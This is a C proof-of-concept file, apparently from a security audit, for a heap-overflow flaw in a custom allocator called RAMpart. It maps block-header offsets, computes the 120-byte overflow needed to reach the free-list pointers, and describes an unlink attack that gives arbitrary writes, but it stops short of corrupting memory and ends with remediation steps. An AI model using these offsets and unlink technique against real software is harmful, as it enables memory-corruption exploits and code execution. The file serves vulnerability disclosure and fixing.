/**
 * @file poc_06_header_corruption.c
 * @brief PoC for VULN-006: Free List Pointer Corruption
 *
 * VULNERABILITY: Block headers contain linked list pointers (prev, next)
 *                that can be corrupted via buffer overflow.
 *
 * CVSS 3.1: 7.5 (High)
 * CWE-122: Heap-based Buffer Overflow
 *
 * IMPACT: Arbitrary write primitive during allocation/deallocation.
 *         Can be leveraged for code execution.
 *
 * LOCATION: h/internal/rp_types.h:174-191
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "rampart.h"

int main(void) {
    rampart_config_t config;
    rampart_pool_t *pool;
    char *block1;
    char *block2;
    char *block3;

    printf("=== VULN-006: Free List Pointer Corruption ===\n\n");

    /* Initialize pool */
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;
    config.validate_on_free = 0;  /* Disable for demo */

    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }

    printf("[*] Pool created\n");

    /*
     * Allocate three adjacent blocks.
     * We'll overflow block1 to corrupt block2's header.
     */
    block1 = (char *)rampart_alloc(pool, 64);
    block2 = (char *)rampart_alloc(pool, 64);
    block3 = (char *)rampart_alloc(pool, 64);

    if (!block1 || !block2 || !block3) {
        printf("[!] Allocation failed\n");
        rampart_shutdown(pool);
        return 1;
    }

    printf("[*] Allocated blocks:\n");
    printf("    block1: %p\n", (void *)block1);
    printf("    block2: %p\n", (void *)block2);
    printf("    block3: %p\n", (void *)block3);

    /*
     * Block header structure (rp_block_header_t):
     *
     * struct rp_block_header_s {
     *     unsigned long magic;           // +0x00
     *     size_t total_size;             // +0x08
     *     size_t user_size;              // +0x10
     *     unsigned int flags;            // +0x18
     *     rp_thread_id_t owner_thread;   // +0x1C (pthread_t, 8 bytes)
     *     rp_block_header_t *prev;       // +0x28 <-- TARGET
     *     rp_block_header_t *next;       // +0x30 <-- TARGET
     *     rp_block_header_t *prev_addr;  // +0x38
     *     rp_block_header_t *next_addr;  // +0x40
     * };
     *
     * Memory layout:
     * [block1_hdr][front_guard][block1_data][rear_guard]
     * [block2_hdr][front_guard][block2_data][rear_guard]
     *
     * Offset from block1_data to block2_hdr->prev:
     * = 64 (user data) + 16 (rear guard) + 0x28 (prev offset)
     * = 64 + 16 + 40 = 120 bytes
     */

    printf("\n=== Demonstration: Pointer Corruption ===\n");
    printf("[*] Block header layout:\n");
    printf("    offset 0x00: magic\n");
    printf("    offset 0x08: total_size\n");
    printf("    offset 0x10: user_size\n");
    printf("    offset 0x18: flags\n");
    printf("    offset 0x1C: owner_thread\n");
    printf("    offset 0x28: prev     <-- list pointer\n");
    printf("    offset 0x30: next     <-- list pointer\n");
    printf("    offset 0x38: prev_addr\n");
    printf("    offset 0x40: next_addr\n");

    printf("\n[*] Attack scenario:\n");
    printf("    1. Overflow block1 by ~120+ bytes\n");
    printf("    2. Corrupt block2's prev/next pointers\n");
    printf("    3. Free block2 (goes to corrupted free list)\n");
    printf("    4. Next alloc/free follows corrupted pointers\n");
    printf("    5. Arbitrary write achieved!\n");

    /*
     * DEMONSTRATIVE: Show corruption would be possible
     *
     * In a real exploit:
     * 1. Overflow to set next to target_address - offset
     * 2. When block is removed from free list:
     *    block->prev->next = block->next  // Writes to target!
     * 3. Classic unlink attack
     */

    printf("\n[*] Classic unlink attack:\n");
    printf("    If prev = FAKE_PREV and next = FAKE_NEXT:\n");
    printf("    On free list removal:\n");
    printf("      prev->next = next  =>  *(FAKE_PREV + 0x30) = FAKE_NEXT\n");
    printf("      next->prev = prev  =>  *(FAKE_NEXT + 0x28) = FAKE_PREV\n");
    printf("    = Two arbitrary writes!\n");

    /*
     * Modern heap exploits using corrupted pointers:
     * - House of Spirit: fake free chunk
     * - House of Force: corrupt top chunk size
     * - House of Lore: corrupt small bin
     *
     * RAMpart's free list is simpler than glibc but still exploitable.
     */

    printf("\n[!] Not executing actual corruption to avoid crash.\n");
    printf("[*] Vulnerability confirmed: pointers are corruptible.\n");

    /* Clean up */
    rampart_free(pool, block1);
    rampart_free(pool, block2);
    rampart_free(pool, block3);
    rampart_shutdown(pool);

    printf("\n=== PoC Complete ===\n");

    /*
     * REMEDIATION:
     * 1. Use safe unlinking with validation:
     *    if (block->prev->next != block || block->next->prev != block)
     *        abort();
     * 2. Encrypt/obfuscate pointers with random key
     * 3. Store pointers in separate protected region
     * 4. Use guard values around pointer fields
     */

    return 0;
}
